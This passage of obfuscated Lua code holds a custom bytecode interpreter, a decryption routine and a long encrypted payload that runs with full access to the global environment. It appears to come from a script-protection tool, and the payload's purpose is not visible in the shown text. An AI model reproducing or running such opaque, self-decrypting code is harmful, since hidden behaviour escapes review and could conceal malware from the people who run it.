local _ck = _nh.n or #_nh
for _rt = _tk + 1, _ck do _vb = _vb + 1; _ka[_vb] = _nh[_rt] end
end
local _gd = _cv.f6t8h4 + 8
local _re = 1
while true do
local _cg = f1pucw[_re]
local _om = f1pucw[_re + 1]
if _cg == 19 then
_ke[_om] = _ke[f1pucw[_re + 2]]
_re = _re + 4
elseif _cg == 6 then
_ke[_om] = _aa[f1pucw[_re + 2]]
_re = _re + 4
elseif _cg == 36 then
_ke[_om] = _fc[_aa[f1pucw[_re + 2]]]
_re = _re + 4
elseif _cg == 5 then
local _zn = f1pucw[_re + 2]
local _yx = _ke[_zn]
if _zn >= 256 then _yx = _aa[_zn - 256] end
local _kp = f1pucw[_re + 3]
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
_ke[_om] = _yx[_kp]
_re = _re + 4
elseif _cg == 42 then
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
local _gs = _ke[_om]
local n = (_zn == 0) and (_gd - _om) or (_zn - 1)
if _kp == 2 then
if n == 0 then _ke[_om] = _gs()
elseif n == 1 then _ke[_om] = _gs(_ke[_om + 1])
elseif n == 2 then _ke[_om] = _gs(_ke[_om + 1], _ke[_om + 2])
elseif n == 3 then _ke[_om] = _gs(_ke[_om + 1], _ke[_om + 2], _ke[_om + 3])
else
local _yx = {}
for _rt = 1, n do _yx[_rt] = _ke[_om + _rt] end
_ke[_om] = _gs(_wv(_yx, 1, n))
end
elseif _kp == 1 then
if n == 0 then _gs()
elseif n == 1 then _gs(_ke[_om + 1])
elseif n == 2 then _gs(_ke[_om + 1], _ke[_om + 2])
elseif n == 3 then _gs(_ke[_om + 1], _ke[_om + 2], _ke[_om + 3])
else
local _yx = {}
for _rt = 1, n do _yx[_rt] = _ke[_om + _rt] end
_gs(_wv(_yx, 1, n))
end
else
local _jk
if n == 0 then _jk = _hx(_gs())
elseif n == 1 then _jk = _hx(_gs(_ke[_om + 1]))
elseif n == 2 then _jk = _hx(_gs(_ke[_om + 1], _ke[_om + 2]))
elseif n == 3 then _jk = _hx(_gs(_ke[_om + 1], _ke[_om + 2], _ke[_om + 3]))
elseif n == 4 then _jk = _hx(_gs(_ke[_om + 1], _ke[_om + 2], _ke[_om + 3], _ke[_om + 4]))
else
local _yx = {}
for _rt = 1, n do _yx[_rt] = _ke[_om + _rt] end
_jk = _hx(_gs(_wv(_yx, 1, n)))
end
if _kp == 0 then
local _fn = _jk.n
for _rt = 1, _fn do _ke[_om + _rt - 1] = _jk[_rt] end
if _fn == 0 then _ke[_om] = nil end
_gd = _om + _fn - 1
else
local _ul = _kp - 1
for _rt = 1, _ul do _ke[_om + _rt - 1] = _jk[_rt] end
end
end
_re = _re + 4
elseif _cg == 35 then
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
_ke[_om] = _zn + _kp
_re = _re + 4
elseif _cg == 43 then
if _ke[_om] then _re = _re + 4 else _re = _re + f1pucw[_re + 2] * 4 end
elseif _cg == 12 then
_re = _re + _om * 4
elseif _cg == 11 then
local _yx = _ke[_om]
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
_yx[_zn] = _kp
_re = _re + 4
elseif _cg == 13 then
_ke[_om] = f1pucw[_re + 2]
_re = _re + 4
elseif _cg == 30 then
if _ke[_om] then _re = _re + f1pucw[_re + 2] * 4 else _re = _re + 4 end
elseif _cg == 34 then
local _zn = f1pucw[_re + 2]
if _zn == 0 then
local n = _gd - _om + 1
if n <= 0 then return end
local _yx = {}
for _rt = 1, n do _yx[_rt] = _ke[_om + _rt - 1] end
return _wv(_yx, 1, n)
end
local n = _zn - 1
if n <= 0 then return end
local _yx = {}
for _rt = 1, n do _yx[_rt] = _ke[_om + _rt - 1] end
return _wv(_yx, 1, n)
elseif _cg == 22 then
local _zn = f1pucw[_re + 2]
for _rt = _om, _om + _zn - 1 do _ke[_rt] = nil end
_re = _re + 4
elseif _cg == 15 or _cg == 1 or _cg == 32 or _cg == 38 or _cg == 26 or _cg == 10 then
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
if _cg == 15 then _ke[_om] = (_zn == _kp)
elseif _cg == 1 then _ke[_om] = (_zn ~= _kp)
elseif _cg == 32 then _ke[_om] = (_zn < _kp)
elseif _cg == 38 then _ke[_om] = (_zn <= _kp)
elseif _cg == 26 then _ke[_om] = (_zn > _kp)
else _ke[_om] = (_zn >= _kp) end
_re = _re + 4
elseif _cg == 27 or _cg == 25 or _cg == 16 or _cg == 4 or _cg == 24 then
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
if _cg == 27 then _ke[_om] = _zn - _kp
elseif _cg == 25 then _ke[_om] = _zn * _kp
elseif _cg == 16 then _ke[_om] = _zn / _kp
elseif _cg == 4 then _ke[_om] = _zn % _kp
else _ke[_om] = _zn ^ _kp end
_re = _re + 4
elseif _cg == 33 then
_ke[_om] = (f1pucw[_re + 2] ~= 0)
_re = _re + 4
elseif _cg == 17 then
_ke[_om] = {}
_re = _re + 4
elseif _cg == 9 then
local _yx = _ke[_om]
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
if _zn == 0 then _zn = _gd - _om end
local _yi = _kp - 1
for _rt = 1, _zn do _yx[_yi + _rt] = _ke[_om + _rt] end
_re = _re + 4
elseif _cg == 18 then
local _zn = _ke[f1pucw[_re + 2]]
local _kp = f1pucw[_re + 3]
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
_ke[_om] = _zn[_kp]
_ke[_om + 1] = _zn
_re = _re + 4
elseif _cg == 40 then
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
local _nw = _ke[_zn]
for _rt = _zn + 1, _kp do _nw = _nw .. _ke[_rt] end
_ke[_om] = _nw
_re = _re + 4
elseif _cg == 37 then
local _iu = f53vxl[f1pucw[_re + 2]]
local f3z8fm = {}
local _mr = _iu.f3z8fm
for _rt = 1, #_mr do
local _xs = _mr[_rt]
if _xs.f2fegl then f3z8fm[_rt] = _ke[_xs.fq5m4] else f3z8fm[_rt] = _ob[_xs.fq5m4] end
end
_ke[_om] = function(...) return _sy(_iu, _hx(...), f3z8fm) end
_re = _re + 4
elseif _cg == 2 then
local _zn = f1pucw[_re + 2]
if _zn == 0 then
for _rt = 1, _vb do _ke[_om + _rt - 1] = _ka[_rt] end
_gd = _om + _vb - 1
else
local n = _zn - 1
for _rt = 1, n do _ke[_om + _rt - 1] = _ka[_rt] end
end
_re = _re + 4
elseif _cg == 31 then
_ke[_om] = _ob[f1pucw[_re + 2]][1]
_re = _re + 4
elseif _cg == 41 then
_ob[_om][1] = _ke[f1pucw[_re + 2]]
_re = _re + 4
elseif _cg == 21 then
_ke[_om] = {}
_re = _re + 4
elseif _cg == 3 then
_ke[_om] = _ke[f1pucw[_re + 2]][1]
_re = _re + 4
elseif _cg == 14 then
local _yx = _ke[_om]
_yx[1] = _ke[f1pucw[_re + 2]]
_re = _re + 4
elseif _cg == 20 then
local _yx = _ke[_om]
local n = f1pucw[_re + 3] - 1
local _rt = f1pucw[_re + 2]
while _rt <= _gd do n = n + 1; _yx[n] = _ke[_rt]; _rt = _rt + 1 end
_re = _re + 4
elseif _cg == 23 then
local _gs = _ke[_om]
if type(_gs) ~= 'function' then
local _yx = getmetatable(_gs)
local _zn, _kp
if type(_yx) == 'table' then _zn = rawget(_yx, '__iter'); _kp = rawget(_yx, '__call') end
if _zn ~= nil then
_ke[_om], _ke[_om + 1], _ke[_om + 2] = _zn(_gs)
elseif type(_gs) == 'table' and (_yx == nil or (type(_yx) == 'table' and _kp == nil)) then
_ke[_om], _ke[_om + 1], _ke[_om + 2] = next, _gs, nil
end
end
_re = _re + 4
elseif _cg == 29 then
_fc[_aa[_om]] = _ke[f1pucw[_re + 2]]
_re = _re + 4
elseif _cg == 39 then
local _zn = f1pucw[_re + 2]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
_ke[_om] = -_zn
_re = _re + 4
elseif _cg == 28 then
local _zn = f1pucw[_re + 2]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
_ke[_om] = not _zn
_re = _re + 4
elseif _cg == 7 then
local _zn = f1pucw[_re + 2]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
_ke[_om] = #_zn
_re = _re + 4
elseif _cg == 8 then
local _zn, _kp = f1pucw[_re + 2], f1pucw[_re + 3]
if _zn >= 256 then _zn = _aa[_zn - 256] else _zn = _ke[_zn] end
if _kp >= 256 then _kp = _aa[_kp - 256] else _kp = _ke[_kp] end
_ke[_om] = math.floor(_zn / _kp)
_re = _re + 4
else
error(('E'..tostring(_cg)), 0)
end
end
end
return _sy(_ua, { n = 0 }, {})
end
local function _lu(_nw, _dw, _qd)
_dw = _dw or 1
local function KMVX8(_om,_kp)
_om=_om%256 _kp=_kp%256
local r,_cv=0,1
for _=1,8 do
local _jz,w=_om%2,_kp%2
if _jz~=w then r=r+_cv end
_om=(_om-_jz)/2 _kp=(_kp-w)/2 _cv=_cv*2
end
return r
end
_qd = _qd or 40183
local function _tz()
local _zn = string.byte(_nw, _dw)
_dw = _dw + 1
_qd = (_qd * 2894 + 58098) % 65521
local _aa = _qd % 256
local v = _zn - _aa
if v < 0 then v = v + 256 end
return v
end
local function _eb()
local n, _bf = 0, 1
while true do
local _zn = _tz()
n = n + (_zn % 128) * _bf
if _zn < 128 then break end
_bf = _bf * 128
end
return n
end
local function _pc()
local n = _eb()
if n % 2 == 1 then return -math.floor((n + 1) / 2) end
return math.floor(n / 2)
end
local function _ae()
local _cv = {}
_cv.f42qc6 = _eb()
_cv.f97qzi = (_tz() == 1)
_cv.f6t8h4 = _eb()
local _em = _eb()
_cv.f3z8fm = {}
for _rt = 1, _em do
local f2fegl = (_tz() == 1)
_cv.f3z8fm[_rt] = { f2fegl = f2fegl, fq5m4 = _eb() }
end
local _xh = _eb()
_cv.k = {}
for _rt = 1, _xh do
local _sf = _tz()
if _sf == 0 then _cv.k[_rt] = nil
elseif _sf == 1 then _cv.k[_rt] = false
elseif _sf == 2 then _cv.k[_rt] = true
elseif _sf == 5 then
_cv.k[_rt] = _pc()
elseif _sf == 3 or _sf == 4 then
local _qo = _eb()
local _ht = {}
local m = 102
for j = 1, _qo do
_ht[j] = string.char(KMVX8(_tz(), m))
m = (m * 147 + 92) % 256
end
if _sf == 3 then _cv.k[_rt] = tonumber(table.concat(_ht)) else _cv.k[_rt] = table.concat(_ht) end
else
_cv.k[_rt] = nil
end
end
local _mg = _eb()
local _ap, _pn = _eb(), _eb()
_cv.f1pucw = {}
if _mg > 0 then
local _lq = {}
for _rt = 1, _mg do
_lq[_rt * 4 - 3] = _eb()
_lq[_rt * 4 - 2] = _pc()
_lq[_rt * 4 - 1] = _pc()
_lq[_rt * 4] = _pc()
end
local _lb = {}
for _rt = 0, _mg - 1 do _lb[((_rt * _ap) + _pn) % _mg] = _rt end
for _rt = 1, _mg do
local _su = _lb[_rt - 1] + 1
local q = _rt * 4
local _xs = _su * 4
_cv.f1pucw[_xs - 3] = _lq[q - 3]
_cv.f1pucw[_xs - 2] = _lq[q - 2]
_cv.f1pucw[_xs - 1] = _lq[q - 1]
_cv.f1pucw[_xs] = _lq[q]
end
end
local _hi = _eb()
_cv.f53vxl = {}
for _rt = 1, _hi do _cv.f53vxl[_rt] = _ae() end
return _cv
end
local _iu = _ae()
return _iu, _dw, _qd
end
local _1d={
"RKkZgvcUSpc6pQrGPgLddGvE9DmwG__ATUX5xfVlkzYTZ09OVghThpXsKHaKUfJN6gCy5qn_blLSR30pjWHg3UfceMW0aian6l7__HPAPgDn_wAtO0ehj4u6jzd8h7WGC3lLbu3C9Pt6KP2CD1_T47IGQHdM58dUfWUM79l4Pp3qOeqnPOykToGCsqPr2IWtYZnbLg29qVJBYtWLJ_QeGpoKA1xB5oiWAurerLvdmUGlNRmfLIgCNd_nM9ZyajAWlrbDKHTxWz7GXH9SD7DkWiuIn91hN4a2jx7EA_KnsDRwyNzzCak3UIHa0WypJalvDSGxZFz-gbziZh88uwYyvSOw6ygeXDIoEOUrcpezr-_--sl5WHcJz0usQpT5ReONJITg71PxntC-nS7gKZ6VuJjiV8qZFVLf2b1GNZTTduYZCmUn5FDo6Yw7yqbF12e18QOyDAftUvm5CD5ByAAZDLPAhb9ZRoLy-1YliP4KWKPHNDPpBwpf-3coem5BouR2bYk0W5AwKr6FnVi2ZK2RfO5hJzsl34rY9slDAzHgSEkjJfxqP0xV3aPbBqsomtCQ1Dtb58_FZX6dYIdUSPI-rpy54RrWxzyzo5fu-f7HFxl2ETFgJuH2bsZ0ufhS9jc_TKAIyZ5xkR8CDbExlSUNUu-7TLlV5Eztyx1Uid3-pO4m9YNPibgntdo6jJm1tUdTPrfpEOviercWTsnThngJHluvwturg940Z36s7rZhEMvIAS7Aa781KF_ftf2SP16bX9CxrFUK9O64SPZbLY05SXHPkDuWqgpJ3FAswLUs9bACb4m5OrZsBrFFemMwKntVsNXkTH_ak9rIluvRqjtmo9wNEP3CFVnEcfZetuL_FWmLJWFL41YEUS5EikBvOs2En4g0K4AOhV92YEgPwVszy0jIej4RdrdcX4dcNqYTG-QCuSWRJPaOhttVPQkGABG1l-IHr61bzNM-uxp72a39cnlp_--8_gnPiJHRyf5uwESU5c_N_y8qLdG7EsWyP2Kc2oCUpD6h-pPWJgZxMppTzEoiuvVEdhfFAJZiuQcdJ9RE74Ivu7o4XZYr6Pss8ruQlWlYTZse38a60-kmwiNrc10gmaHe0uef9h3C1kaJvqwVV7ymEjt24kkBf3jQW_6N_LKS0nBtoeiGQFdhox0OygAo4cIWiNr9HWozq17l4pDIplLN9abS-8CTtVMNFS3YC5EnQX99JdBsLfEcPSbLhMMPz6udG2DrPXOlniI6qS4mR6RpkR1CFvtHwjVNsR8sKpg97blFPLY26-Aeen5R2yPf0-Z_MjMKjbyGgnpNi8bJ4pPQfzYBCkR7lhy7Uf1uGS6EENpFNTjXml4udCFpb6cXBB7BlRqy5hNh_SbNYc3OOYmkAowC4DpQO9u-G-l3zkPE91X1KiZUYp0BdYUL7wIX1ZfqJoVC5ioNC0DZyAJ9_mAuNB_cf4tDTpF5Y27ET0f9orr23YXxRe1bzDzJvzyNsT1KOyTquD2Qhu45ektkdPt-3HxgVqhzQu5unYO4mBOfzmDiuDUBgD4j5fntWEw0G3qd3LbyRcBXk1ByAUJviKNK1odfm7BglEoyh0yOExZ_ILDSZmJfbeiMpyh5YnZuW9m3t35XMd_s9rLHIdnkAWke682dxGUm8pARRtGY3wMz_tr2i0W86IqsyDCZEO3IzqtIYMRB46JtLrRzcbD-D0sODzAyCMVMOSPVKmemgSc_7mWnRb9UWn1z9YwX8OhfCod6o0AfyjchoGrjIh0ZjXU0-lt2QWDubZ58gZcHqykFWBxhw9rk2Q6uJNya2agnJE7r193r92FaoWJFXX9urQRoSfRfr7bwrN677OtChqYVeh0NYJJbc3lo-zNVvZeTQTYFhm_-ujDQfkVawkBwYKNMDK5SDrZaJyud0Y7-T3-s7yNYEyNLSFZCPEnTnfhVgJka8yuZcddgH_WMUIOTFjXTQ12uNergfgVVM6YubYC_MHEFY3U0NlHukpfXq_3YxTWKiMbktsWR4pJ7-kSKRhp_OI3APK02j31EOMfdsaQicTN52G_l70FIj56D87u5bBhMASBiKKq_Uo0aJFLOteqWweKPIJ5OkQTkKZILlPW6_NZfcm9k8eZnQHQbO2pEHMuVr1P1wv_FaJh89Y_BwMJMxZ3NcZUdv7U0x7NmozYtwCugF8lKl5xrahMT_fvm_oiqLL8cwcW1hwpFOKYfYGX1ZkP2KihBzzZkfQwkSl_d4OyH7xdJnpLdXt2p7QggDa0A9LRkEBPwjkSef_N-iivJF_y7hjiRS30ZketH7McJ0rmbLHIqwMpqTuSHhct7uvsf6vwATvA7oncMP8vLdEhY6OfohlHACMEINz3FyHkY67t7oRdqZ69wTvjT9ZyU2gRE8Ez3rHyrO5Az0qsgRoYf157TE9ONVCr71DY64CCq0pyBVQa6ZmnVtXjBZ675YR_9chO7xR0zIkPMUu7Nf0mjkRgXTd7zkWxK7Jf0W8crHw9NHGchEDx2KduuUmpnBch6mVBMBX-lxNOcVaZXJFniFqkOrp0VxY-QOWTVmQDefBCCW-OF8hnH-rpR3psE8TR8wABvvADTQKpK1PGzWgWMbg8Q3AgGFhFLRYmnGtP9q1_BpDnYWwcASKPr2CxDUBvHBjbp5CrPMjYvcTyMg8sXiqSGFK58OTYwxI0DsWe0HzvU_gw6FaOMx1u7VjMC5D3zLbTT73M4SmSWRFQLK2QFmaJ0wVX3sHJdAxFxzfWtLwFuzs0Wy5jU0A3V5TbdqZKUs5gsxAgVSbpfeUUdvnC_ymR_2gWjlaWUE3mh0BKurzoPM9qIq8RSCu2ZevxRhzeW8gc0qZqYMqidqOrKdIeHG3LnaTOOKtbpwnCS4sXF1a9Y4G3ay65br0qaHXIu6iyGTmWC5T4s-_aQK9Zp5Gy24317PxyCJ1K7p35N_Nix8nC3EqZ_UkobdutqPxg2I3AYF5ySWdP8OLboWjnjPb1UilsdZzNA0ArOAzCjCJObl6erke-wrS_mxVi8ybT6boLy1xh6oFi9acJhJJqXpQ_AJTkBhV9Az8m4l26LqUhuNJw54iy1z27-WQVXAjT3jR72M_R64mGi9awEiZEhUYmQyxDPXHYy-1jyQMYIFJFznN2IZ1epOajzfNuQRuJdBmCxt7vTNY5poXKH10r2S4oNz4NyrJYlsIqYJdSbUeyGxSPe8nlfsEschH26KXsQr2Jd8BuC0X_QfC21WZt5r2K3lRmNDe11VUFTe2ZoxwfazIhOcWUqsMnHQy5T1YMT8uaJSI-1RmWswdmZ-tQup5MG18-1v3f-sUHr8LWssAw-06aYqfL85bRVPpaVkRjYwi42oyItjn7WrRQD8c9APoV5lxwNX_BqHrfZaxfr-KjnApg1CAqX2z6KKsNM6HmrdIxBCTD9rG6bGnLl7jk1WMuLRh51SlIEISgbUgbP_hvotaVSqE_i-8mOyVfTVJJK-ZufksrZzDiByFj976tOCC4a3MZIbRxX9Td2PNSwrWYqjYI_ui-HVT6rKggByCeHSi8fWyCBg-t_JmaPMwF8oY6QTmjoUOr2-dRScDRVzka6B_yifwC49m1JO22rRXFkweJWrITTlRpUWe3vlNvlDvlxl5-tzvzVsGdLjEzKn5OYBqPXh50jSlFwnovk_F3FSqV_ko2XT-pumhshPIctZE6-frvubExGZOAcqo9sa3FxoCzuxvom1lvlBDC_Hc0T5qMEfEJLUE1yl3go9hHBgdRKD-evUwJSWNxbSetAXsuo-DebASsrV6FZPe-4IaXM29gLifwIi0ugqGEPIQZbukdM0RzBOAVqerxdmiKodl21_L9GSMo5vCWMtHzovof8SlvoOQNM8jsNvDWcCEb3eNN1Q3SwcJd1TZaOiU1f9JI3CiuBAsL8bwfTWdJMy8gGIhNS4bp-1i0HyGVr0jDdARz8V_WN7Y7tkj33FhMCSRGERQSGeKfdZccsSS4OGKho9AJieHv4j4ae7Zlb3OO-OogihZuUBx5YT79tNEnWh1ozMBCfkFOUiAMxLRnvqzlqG86cpwhU6CyGK_wQFwL50WZ4HK-UCJBRz3orrfF_EOr-QFMEvNyZT_Pe8oOUheMePj8KiQFAFCaXGSjmRu6d59h90BAgpiXZmpyJEuDtQ9MoiaVIlJiwWvcgP53jDSjH8MyyXmAVvsIeRAxwwL9ETYbDlResnjF4wDBeDzBW0vr88HmbhB3AILCcdoWCpyJadfq-99fm6PQrsDRayDxk_ugzEIDBvKZJI-DIezivkoYvN7TZ-aHTgER87CKOYA9yoEt4aYRS6AGACU_7vaksBa21aaN3nm1-YP_VgsUoylBIvvZNYgzMUdNUCkxVjntJAd4UWTJrz4hBBLSmunCC-ub5YDkPxG2o4G5ROG29f2D3e-KuvPYZsKPSU7F6OEvMB3EGfbGG6VyRfGTijF00rmb6biW-oqUvf-ksWzyhtV5t9NuORXqdkvBude_w4mbolAzRYHXAqme9obIo3KVvxn-vmo2TTLf2xfM2nrIkcTAphxZXvGmdeWi6Cnh_gDv0MLFLm0WH2hrIIg1xRnQuIk0p-cXUuc89Kt2D91DBBRoEYCDgwfTl0TUUty-_wer3hkxTN1SIzZWCM7T9VR4O4XKA6VIrqmePEtlSxZnHXW34tFenhHnikRXsZVuuNGLaxNQDHL2dcLtEGRrRpXrn4nI-aL4TTb56ZbuDUrOE12tAbGin91Hck64jvRehBq8K8ty5ZRGMdMN0rRUv1DpAw3e9NSs72Cgko8JIC8gbG7ZEk3TxQJtxgS5q77hilAPhy8owYXH-SRXwmbGDXF9rAHG22Q0QS1T6a4rk3Ku89cPUxSQpmsC13N8i5enwDadK5AG50FMPQR1K20LfKzr47kvSXoxPz8mQ3IO5bgRfmyV_GWG8UQG8h_6fwuV1tQ_NPu_-86rWzGh1il3ZIiLy8QN8z6MyyMDjEwM569WGjyTvUQ66AA8X-WKJs2e_igdIzDigAcnjdmtjGDIxkBWb3y_6I2bXxGCxtCihQ6e-43RWVDWqrGy4ene7plFOd3iNT30V7TV8SJPBR1Ohjl-hTQc7wrPmEgTyTCdsqYkSgVQYQtCeiBNI35PpVb0k692R6JFbHeUnURxrjWTag5e_seIjfTUxmKaT_WtOtBda3a4burwzTUwQ9snVsUuXwiOKG2psvmHlbLuVYs4drj3PvtS-K5555a7FVoYM9WOLvRa4b2coTMmwF044fpuPLjZmaBVF6NKJpGIyIBe7q5fMOFD2JP39bzyPCK4gARDCCcHezUbC9T_8FW006twpO7YH3GI1dp8goagSnOtnQf_fOiTzscQvlrz2sq_N2J_7jhYoo2OgbnBKwcF_q5YsrMyJCF0EYby-SoHcal8pzLzs5xOjlbQph4T1EOv_otez3okfef9iXJwPsNfnveQhsvGBFcULCPv-1_eMB8lf_gsFdm0NEpseULi4h9R9hIsQwUaBFxFPSjOgomummN8XwqmgoPRMmIlmliWXJcnavQT6Gl80qykhj2p-4iupkI1B4I3vc7Od1G26pCfVqlA2B-1sIhhdWOmDPzLwN93b6JuuRjszgRL_QG2QlnLpzzc2RSO2qAzO8q4hXc7DWufYZ7hOQDdGCl1gKZQ7KqfUYJ16E-JhcEfYM7AtvjmNMmussfklUpJeYsFsiaTwtzL4eheLb3HB5C9ZVyuyvfHOEk14Z33yLC9yZ7qLCIXOu51Qb5-wUzIMQsMRpELQyItT4WZZe2UUndoD64BPZBnV4Tizr6FqqQJxyKjCxUCClCvmebUd9sIj_Bzsd5kfY3UmwLE7edW6IXB1xc0rIMYlNWYNmOdhx7vUm9Et4-qW4cTesF8z0ClJAd32T1H9R3Oa3XQeGwXS0ggtW5maJ8rF8t1CENwFTn6Grgm-HtAeqpDbIx9o6IlhDpCI9bv1DGGMWmGcQH9bBWzy08o0ERgcNVCpJvv5OLsZhyLD1d33p8MfHzIHrJp2gT4m2ed0qeQKe6V6kMUNs2OPlUff4gLKR1yCaYfbB4N1j_kwMsLCQElyaYLUEzQNLWql7M39SfwR-zDcrHwxbqJVVT6jNmFQfdomNd1e7vFscav8xNlvk2Ru7g4Hblo--ygaKgyY312lH6jhPsHFa0us0ATm7YA7rBxyY67BdPY-8BexwXGyNeVT6_9Z-3FhdGc4Iz71SP2lwXfvQbuM01ciWCRyxV3N7ryQxwLsioYAU-VJfQdLTu8oX61fvOjeaHmI_q5R2LTIOvyZiYyHPB1fGt4jtva7AkdkBCW4qi0iwo9BlvgrKLhrB7Kf2p64spOascU5MCq6IDqaatOyWTC5XBUxeGAaDG-5Okw_Vgxg0z5JDfRl7OsJq1BRrU701sXWRYYLxYUi0mPTe0NE8aUuC9FuwcgwbDpDziIEfppalRByHZBFJPvbj_0UWnALNZMdciU9dVUS1IbdnZNC5JU3bRmv3H2FtThibX94gi_QKUC762LPNGQJi0pHK-v8aRjiQ9R2vJj3Ghxc-k6AuHZRR-RsI5Hhu4DBrO4-zCQuCOkCXQGVlH6rYIuBoydbVwbSQPvSqa0yNFEkvlP4eRbWV_sUHheV6Yrj8cE4TQmYhl8GG5GnBEpgiCugJtqzb0z-z9_9ZqytyPpBN9mjbLQxpK-gHSJvZhbNga7T34fPYWE47DX3x1yhURWxc33NTaYga3z-awt3Ij03okAR_MmSstsKRT5ON5dR7IrUwTKrZMXSLjxOhjQaNGIcxIwXRubI-UimDk4hI-DiVZl7At228cZZnXRxXUUYGgTB60hNSz1Yn5AYqV53DFtun7k_SS7k9WviXdkwufr22pnNg454WgpFyPhteFjKs5FJ_ZXal1epsPp1FYb1crkF2V5_YHl4jPQliCTMAahPzijeNNoXcxQPBNWUm7zHMlhbzAKLpVQbSywhRePkSGgsMYybbBN1RZTGAZVNZYFdosOXkRFcu8HlUfjj_TLy9ZrwpgcbMxgMW4p2B3NIUMT-2v7r_cYbFTac9f5beZf6G5PG0E46ej9zrYiWZ_dS_2YxK4gdKEXGAWasFN-yH-Rqydq4OqyEFj5QLTXa6lJdo95hXqn8eOKCaezkxaKwtQn73mUAw_758kqACgorIHqOhZx5cq7dZuond6WKtxfRf3y_RdzgF_xdNA7fhVCyoDimbqiA-T5pEYLUZ3JUdcdNvI_u2ukOq_qCpz3cV-EIrtG3bcxgKSxt18ssk0_XiiWLSA3j4etbC-0VCDz2H-MXyrhwkiOjsnfpJ_bPgKtFu_5ZkwE6-L5cV2-6hxHz3fQtMVzgGbc66lWI8b-hi7BrZOxKDHBhKAySnLvdByFPg56-IVQ826mB0HWhOpFSsU8WRqJKuQm0kW8bHRI4IZ5vUFwOcUlW9KAP_vrYfamDAHlA4OtnwoTDwcu-m3QXC5bbW9nxAm8hkwN2O--NZc3jHEM8xCZhyTXrSh8oyzNtRr8emFStytCFKll6GODxMdrrbLKHVr3xHhozwWjo7oM40EiSEdM0ZinV4nv6FR0dMqxR18j4haqcTrMYwIC9mraVf-aHFi0JYXOf2uHSXWUn5A2gEJPNrAFZMObjsvsI4Q5RnTEfvhW21fj_nw9Zy3kCgOtHOX97bPFQpJBgs6kvcLV4SYMKjSIDPisTejDMx6AOchtHfjG5CUA-jFGlaFQRIC30P1z2yPH_EPIzkvBVy_2cuSvjXQKDN3UyPKITs5Q8XyXpz3YmjBfgISuQbYcUix2LUANDszIPXw1FFBioNwlOdsTl3jpBhoU68TZkGLiAf5ETNeuC8MWV4EMJhlw1wCNeWSB-uRW2QcSt2BU4TCRz8En1PrVHI7tolwlPfiKhEvhkAmnFFbvklk8g8334jnWhnyNqZEzyeWSmNnMmrQazITN8u5cQSt9qixBcH4ePWfEdSqLt5LXSttTBa8TcJuIQ",
}
local _5={1}
local _cb={} for i=1,#_5 do _cb[i]=_1d[_5[i]] end
local _4e8,_469e=_23a(_bc(table.concat(_cb)))
if _469e~=2831099675 then error(string.char(53,54,50,53),0) end
local _f
pcall(function() if type(getfenv)=="function" then _f=getfenv(1) end end)
if type(_f)~="table" then pcall(function() _f=_ENV end) end
if type(_f)~="table" then _f=_G end
local _37f,_5f6,_2304=_lu(_4e8)
local _fb=_at(_37f,_f)
return _fb
end)()
end)()
if type(_7aea30) ~= "table" or type(_7aea30[1]) ~= "function" or type(_7aea30[2]) ~= "function" then
  _4eec69(string.char(80,114,111,116,101,99,116,105,111,110,32,117,110,97,118,97,105,108,97,98,108,101))
  return
end
local _eb3dae={}
for i=0,255 do _eb3dae[i]=string.char(i) end
local _628f5b,_92400d={},{}
do
  local ta="92bd335e969a8d226e5f2a93bc6aca244c7c6788f18fa92fba4d235b0aed35f8c7df9e15e96f11be524a2cd08699537060828581087f68f3943ff9ded1b21de1d977987e7a265cf6e3199de755c947af5ad409329c50abfbdbef625820d337343b21a4c40ffac528ec6303eafca7160651ce0ecd291f302ea20d8e104857e2aaeb72bf1c8c97cc0290874e71d58afd9fa67349cfb92bc645070bb51bff9bc1658038a1a53c761236a0c2253e83d643783df2cb0ce0b301dcb691e874136654f0d2e4dac8f54105005659795da869616dd81a1714d764a38bb0b8f4844495acbb18e5c0f704891e4b7b313a7dee2742b44f46c3b175b7ddfe39406baead6ce62d"
  local tb="6620ecbaa4c21d51ed41d2f58a14b824e56f67431338fd8ef349e747d0f4d1152737da090d2d91d8795661957d68cbe846d9457f7a2aac86441abd07a0fc36ee849fa5e47e855fa721a81298946b1c90728d01ff690ca1834eaa17f699733d77048bb7711f165574d6cdb4a9c0af607be9d7cac5c9b03a293110efdb485cab974f08e13c190a88b38cb2181b3e622c78f2ddcc0f9badae1ef9396c42760bc43353cfb525328265fee211e6d48f280e6d80ea6e634be3c7bc23b1c35d703bb6549d4a2fdc7c3f02b9eb305ef0a39a75a6925950c1f1fa9cd506ce96de3487f7a22ec6934d22e05a2b64bf4cfb35264057be6af889525bbb0058c8d3df059e0381"
  for i=1,256 do
    _628f5b[tonumber(string.sub(ta,i*2-1,i*2),16)]=i-1
    _92400d[tonumber(string.sub(tb,i*2-1,i*2),16)]=i-1
  end
end
local _34bf1b={}
do
  local a="4_fv9GFZmwUqidDYVak2JXgLRCMB35Pb" .. "sHOSyutcTNKro0IheW1x6lAzEp7-8Qnj"
  for i=1,#a do _34bf1b[string.byte(a,i)]=i-1 end
end
local function _300f8b(s)
  local out,n,acc,bits={},0,0,0
  for i=1,#s do
    local v=_34bf1b[string.byte(s,i)]
    if v then
